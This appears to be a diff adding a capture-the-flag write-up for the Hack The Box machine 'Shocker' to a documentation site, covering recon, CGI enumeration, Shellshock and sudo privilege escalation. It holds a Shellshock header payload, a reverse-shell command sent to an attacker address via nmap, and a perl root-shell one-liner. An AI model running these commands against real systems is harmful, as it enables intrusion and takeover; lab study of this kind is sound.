@@ -2651,6 +2651,47 @@
     Foothold
   </a>
   
+    <nav class="md-nav" aria-label="Foothold">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#80-http-cgi" class="md-nav__link">
+    80 - http - cgi
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cgi-shellshock" class="md-nav__link">
+    cgi - shellshock
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shellshock-payload-explanation" class="md-nav__link">
+    shellshock payload explanation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#get-shell-method-1" class="md-nav__link">
+    get shell method 1
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#get-shell-method-2" class="md-nav__link">
+    get shell method 2
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -2900,6 +2941,47 @@
     Foothold
   </a>
   
+    <nav class="md-nav" aria-label="Foothold">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#80-http-cgi" class="md-nav__link">
+    80 - http - cgi
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cgi-shellshock" class="md-nav__link">
+    cgi - shellshock
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shellshock-payload-explanation" class="md-nav__link">
+    shellshock payload explanation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#get-shell-method-1" class="md-nav__link">
+    get shell method 1
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#get-shell-method-2" class="md-nav__link">
+    get shell method 2
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -2934,10 +3016,116 @@
   <h1>Shocker</h1>
 
 <h2 id="machine-info">Machine Info<a class="headerlink" href="#machine-info" title="Permanent link">&para;</a></h2>
+<p><img alt="image-20231201000210315" src="../Shocker.assets/image-20231201000210315.png" /></p>
 <h2 id="recon">Recon<a class="headerlink" href="#recon" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>PORT     STATE SERVICE VERSION
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>|_http-title: Site doesn&#39;t have a title (text/html).
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>|_http-server-header: Apache/2.4.18 (Ubuntu)
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>| ssh-hostkey:
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>Aggressive OS guesses: Linux 3.16 (96%), Linux 3.18 (96%), Linux 3.2 - 4.9 (96%), Linux 4.2 (96%), Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 4.4 (95%)
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>No exact OS matches for host (test conditions non-ideal).
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>Network Distance: 2 hops
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></code></pre></div>
+<ul>
+<li>attack vector: 80 http, 2222 ssh (not recommended)</li>
+<li>find Ubuntu version by apache version or openssh version</li>
+</ul>
+<p><img alt="image-20231201020057658" src="../Shocker.assets/image-20231201020057658.png" /></p>
 <h2 id="foothold">Foothold<a class="headerlink" href="#foothold" title="Permanent link">&para;</a></h2>
+<h3 id="80-http-cgi">80 - http - cgi<a class="headerlink" href="#80-http-cgi" title="Permanent link">&para;</a></h3>
+<ul>
+<li>80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</li>
+</ul>
+<p><img alt="image-20231201020133491" src="../Shocker.assets/image-20231201020133491.png" /></p>
+<ul>
+<li>nothing found inside image</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>$ exiftool bug.jpg
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>ExifTool Version Number         : 12.67
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>File Name                       : bug.jpg
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>Directory                       : .
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>File Size                       : 37 kB
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>File Modification Date/Time     : 2014:09:26 02:16:14+08:00
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>File Access Date/Time           : 2023:11:30 22:50:44+08:00
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>File Inode Change Date/Time     : 2023:11:30 22:50:38+08:00
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>File Permissions                : -rw-r--r--
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>File Type                       : JPEG
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>File Type Extension             : jpg
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>MIME Type                       : image/jpeg
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>JFIF Version                    : 1.01
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>Resolution Unit                 : None
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>X Resolution                    : 1
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>Y Resolution                    : 1
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>Comment                         : CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 90.
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>Image Width                     : 820
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>Image Height                    : 420
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>Encoding Process                : Baseline DCT, Huffman coding
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>Bits Per Sample                 : 8
+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>Color Components                : 3
+</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a>Image Size                      : 820x420
+</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a>Megapixels                      : 0.344
+</span></code></pre></div>
+<ul>
+<li>
+<p>subdomain -&gt; nothing [x]</p>
+</li>
+<li>
+<p>path: <code>dirb $IP</code></p>
+</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>+ http://10.10.10.56/cgi-bin/ (CODE:403|SIZE:294)
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>+ http://10.10.10.56/index.html (CODE:200|SIZE:137)
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>+ http://10.10.10.56/server-status (CODE:403|SIZE:299)
+</span></code></pre></div>
+<ul>
+<li>enum files inside <strong>cig-bin</strong>, <code>gobuster dir -u $URL/cgi-bin/ -w /usr/share/dirb/wordlists/common.txt -x php,sh,py,pl -t 50</code></li>
+</ul>
+<p><img alt="image-20231201020248166" src="../Shocker.assets/image-20231201020248166.png" /></p>
+<ul>
+<li>visit this url in browser get a <strong>user.sh</strong> file</li>
+</ul>
+<p><img alt="image-20231201020317531" src="../Shocker.assets/image-20231201020317531.png" /></p>
+<ul>
+<li>since this is an output of <code>uptime</code> -&gt; user.sh can be executed by apache server -&gt; Ubuntu version <strong>Xenial</strong>, bash version might be &lt; 4.3 -&gt; <strong>shellshock</strong></li>
+</ul>
+<h3 id="cgi-shellshock">cgi - shellshock<a class="headerlink" href="#cgi-shellshock" title="Permanent link">&para;</a></h3>
+<ul>
+<li>nmap script scanning -&gt; yes</li>
+</ul>
+<p><img alt="image-20231201020509092" src="../Shocker.assets/image-20231201020509092.png" /></p>
+<h3 id="shellshock-payload-explanation">shellshock payload explanation<a class="headerlink" href="#shellshock-payload-explanation" title="Permanent link">&para;</a></h3>
+<p><strong>http request header:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>GET /cgi-bin/user.sh HTTP/1.1
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>Host: shocker.htb
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>Connection: close
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>Cookie: () {:;}; echo; /bin/bash --version
+</span></code></pre></div>
+<h3 id="get-shell-method-1">get shell method 1<a class="headerlink" href="#get-shell-method-1" title="Permanent link">&para;</a></h3>
+<ul>
+<li><code>nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd='echo Content-Type: text/html; echo; /bin/bash -c "bash -i &gt;&amp; /dev/tcp/$LOCAL 0&gt;&amp;1"' $IP</code></li>
+</ul>
+<p><img alt="image-20231201020559889" src="../Shocker.assets/image-20231201020559889.png" /></p>
+<h3 id="get-shell-method-2">get shell method 2<a class="headerlink" href="#get-shell-method-2" title="Permanent link">&para;</a></h3>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE Exploits/Shellshock CVE-2014-6271.py">PayloadsAllTheThings/CVE Exploits/Shellshock CVE-2014-6271.py at master · swisskyrepo/PayloadsAllTheThings (github.com)</a></p>
+<p><img alt="image-20231201020852557" src="../Shocker.assets/image-20231201020852557.png" /></p>
+<p><img alt="image-20231201020855771" src="../Shocker.assets/image-20231201020855771.png" /></p>
 <h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
+<p><img alt="image-20231201020904546" src="../Shocker.assets/image-20231201020904546.png" /></p>
+<ul>
+<li><code>sudo -l</code> -&gt; <code>sudo perl -e 'exec "/bin/sh";'</code></li>
+</ul>
+<p><img alt="image-20231201020913906" src="../Shocker.assets/image-20231201020913906.png" /></p>
+<p><img alt="image-20231201020940118" src="../Shocker.assets/image-20231201020940118.png" /></p>
 <h2 id="exploit-chain">Exploit Chain<a class="headerlink" href="#exploit-chain" title="Permanent link">&para;</a></h2>
+<p>recon -&gt; cgi dir -&gt; cgi script -&gt; shellshock -&gt; sudo -l -&gt; priv esca, root</p>
 
 
 
